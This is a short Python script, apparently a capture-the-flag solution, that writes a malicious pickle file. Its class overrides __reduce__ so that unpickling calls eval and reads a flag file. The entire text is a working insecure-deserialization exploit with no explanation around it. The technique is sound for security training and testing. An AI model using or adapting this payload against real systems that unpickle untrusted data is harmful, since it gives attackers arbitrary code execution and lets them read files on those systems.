import pickle

class Exploit:
    def __reduce__(self):
        return (eval, ("open('/flag_5e6b4b0d.txt').read()",))

with open("exploit2.pkl", "wb") as f:
    pickle.dump({'data': Exploit()}, f)